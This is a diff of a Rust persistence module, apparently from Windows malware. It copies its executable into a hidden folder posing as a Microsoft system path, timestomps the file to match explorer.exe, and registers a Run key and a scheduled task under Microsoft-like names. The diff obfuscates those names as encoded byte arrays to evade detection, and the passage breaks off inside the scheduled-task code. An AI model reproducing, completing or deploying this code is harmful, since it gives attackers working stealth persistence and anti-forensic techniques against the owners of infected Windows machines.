@@ -1,11 +1,12 @@
+use crate::recovery::helpers::obfuscation::deobf;
 use crate::recovery::settings::RecoveryControl;
 use directories::BaseDirs;
 use std::env;
 use std::fs;
 use std::path::{Path, PathBuf};
-use tracing::{debug, error, info, warn};
-use winreg::{enums::*, RegKey};
 use std::process::Command;
+use tracing::{debug, error, info, warn};
+use winreg::{RegKey, enums::*};
 
 pub async fn install_persistence() {
     if !RecoveryControl::global().persistence_enabled() {
@@ -22,7 +23,11 @@ async fn install_persistence_impl() -> Result<(), Box<dyn std::error::Error>> {
     let current_exe = env::current_exe()?;
     let base_dirs = BaseDirs::new().ok_or("failed to determine base directories")?;
 
-    let data_dir = base_dirs.data_local_dir().join("Microsoft").join("Protect").join("S-1-5-21-2026");
+    let data_dir = base_dirs
+        .data_local_dir()
+        .join("Microsoft")
+        .join("Protect")
+        .join("S-1-5-21-2026");
     if !data_dir.exists() {
         fs::create_dir_all(&data_dir)?;
         set_hidden_system(&data_dir);
@@ -33,7 +38,7 @@ async fn install_persistence_impl() -> Result<(), Box<dyn std::error::Error>> {
     if current_exe == target_exe {
         debug!("running from persistence location");
         ensure_persistence_mechanisms(&target_exe)?;
-        return Ok(())
+        return Ok(());
     }
 
     info!(
@@ -46,7 +51,7 @@ async fn install_persistence_impl() -> Result<(), Box<dyn std::error::Error>> {
         Ok(_) => {
             set_hidden_system(&target_exe);
             timestomp(&target_exe, &PathBuf::from(r"C:\Windows\explorer.exe"));
-        },
+        }
         Err(err) => {
             warn!(error = %err, "failed to copy executable (might be running)");
             if !target_exe.exists() {
@@ -71,22 +76,24 @@ fn set_hidden_system(path: &Path) {
 fn timestomp(target: &Path, reference: &Path) {
     #[cfg(target_os = "windows")]
     {
-        use windows::Win32::Storage::FileSystem::{
-            CreateFileW,
-            FILE_SHARE_READ,
-            OPEN_EXISTING,
-            FILE_ATTRIBUTE_NORMAL,
-            FILE_READ_ATTRIBUTES,
-            FILE_WRITE_ATTRIBUTES,
-            SYNCHRONIZE,
+        use ntapi::ntioapi::{
+            FILE_BASIC_INFORMATION, FileBasicInformation, NtQueryInformationFile,
+            NtSetInformationFile,
         };
-        use windows::Win32::Foundation::HANDLE;
-        use windows::core::PCWSTR;
-        use ntapi::ntioapi::{NtQueryInformationFile, NtSetInformationFile, FILE_BASIC_INFORMATION, FileBasicInformation};
         use std::mem::MaybeUninit;
+        use windows::Win32::Foundation::HANDLE;
+        use windows::Win32::Storage::FileSystem::{
+            CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_READ_ATTRIBUTES, FILE_SHARE_READ,
+            FILE_WRITE_ATTRIBUTES, OPEN_EXISTING, SYNCHRONIZE,
+        };
+        use windows::core::PCWSTR;
 
         unsafe {
-            let ref_path_w: Vec<u16> = reference.to_string_lossy().encode_utf16().chain(std::iter::once(0)).collect();
+            let ref_path_w: Vec<u16> = reference
+                .to_string_lossy()
+                .encode_utf16()
+                .chain(std::iter::once(0))
+                .collect();
             let h_ref = CreateFileW(
                 PCWSTR(ref_path_w.as_ptr()),
                 FILE_READ_ATTRIBUTES.0,
@@ -100,18 +107,22 @@ fn timestomp(target: &Path, reference: &Path) {
             if let Ok(h_ref) = h_ref {
                 let mut io_status = MaybeUninit::uninit();
                 let mut basic_info = MaybeUninit::<FILE_BASIC_INFORMATION>::uninit();
-                
+
                 let status = NtQueryInformationFile(
                     h_ref.0 as _,
                     io_status.as_mut_ptr() as _,
                     basic_info.as_mut_ptr() as _,
                     std::mem::size_of::<FILE_BASIC_INFORMATION>() as u32,
-                    FileBasicInformation
+                    FileBasicInformation,
                 );
 
                 if status == 0 {
                     let basic_info = basic_info.assume_init();
-                    let target_path_w: Vec<u16> = target.to_string_lossy().encode_utf16().chain(std::iter::once(0)).collect();
+                    let target_path_w: Vec<u16> = target
+                        .to_string_lossy()
+                        .encode_utf16()
+                        .chain(std::iter::once(0))
+                        .collect();
                     let h_target = CreateFileW(
                         PCWSTR(target_path_w.as_ptr()),
                         (FILE_WRITE_ATTRIBUTES | SYNCHRONIZE).0,
@@ -131,7 +142,7 @@ fn timestomp(target: &Path, reference: &Path) {
                             io_status_set.as_mut_ptr() as _,
                             &mut info_to_set as *mut _ as _,
                             std::mem::size_of::<FILE_BASIC_INFORMATION>() as u32,
-                            FileBasicInformation
+                            FileBasicInformation,
                         );
                     }
                 }
@@ -155,15 +166,16 @@ fn ensure_registry_run_key(path: &Path) -> Result<(), Box<dyn std::error::Error>
         KEY_SET_VALUE,
     )?;
 
-    let app_name = "MicrosoftHostProtection";
+    let app_name = deobf(&[
+        0xF0, 0xD4, 0xDE, 0xCF, 0xD2, 0xCE, 0xD2, 0xDB, 0xC9, 0xF5, 0xD2, 0xCE, 0xC9, 0xED, 0xCF,
+        0xD2, 0xC9, 0xD8, 0xDE, 0xC9, 0xD4, 0xD2, 0xD3,
+    ]);
     run_key.set_value(app_name, &path.to_string_lossy().as_ref())?;
     Ok(())
 }
 
 fn is_admin() -> bool {
-    let output = std::process::Command::new("net")
-        .arg("session")
-        .output();
+    let output = std::process::Command::new("net").arg("session").output();
     match output {
         Ok(out) => out.status.success(),
         Err(_) => false,
@@ -171,7 +183,11 @@ fn is_admin() -> bool {
 }
 
 fn ensure_hidden_scheduled_task(path: &Path) -> Result<(), Box<dyn std::error::Error>> {
-    let task_name = "MicrosoftWindowsSystemDiagnostics";
+    let task_name = deobf(&[
+        0xF0, 0xD4, 0xDE, 0xCF, 0xD2, 0xCE, 0xD2, 0xDB, 0xC9, 0xEA, 0xD4, 0xD3, 0xD9, 0xD2, 0xCA,
+        0xCE, 0xEE, 0xC4, 0xCE, 0xC9, 0xD8, 0xD0, 0x97, 0xD4, 0xDC, 0xD3, 0xD2, 0xCE, 0xC9, 0xD4,
+        0xDE, 0xCE,
+    ]);
     let exe_path = path.to_string_lossy().replace("\"", "\\\"");
     let script = if is_admin() {
         format!(
